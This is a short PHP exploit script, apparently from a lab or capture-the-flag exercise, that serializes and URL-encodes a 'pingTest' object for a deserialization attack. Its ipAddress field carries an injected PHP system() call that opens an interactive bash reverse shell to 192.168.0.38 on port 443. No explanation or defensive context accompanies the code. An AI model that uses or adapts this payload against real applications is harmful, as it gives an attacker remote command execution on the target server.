<?php

class pingTest {
    public $ipAddress = "<?php system('bash -i >& /dev/tcp/192.168.0.38/443 0>&1'); ?>";
    public $isValid = True;
    public $output = "";
}

echo urlencode(serialize(new pingTest));

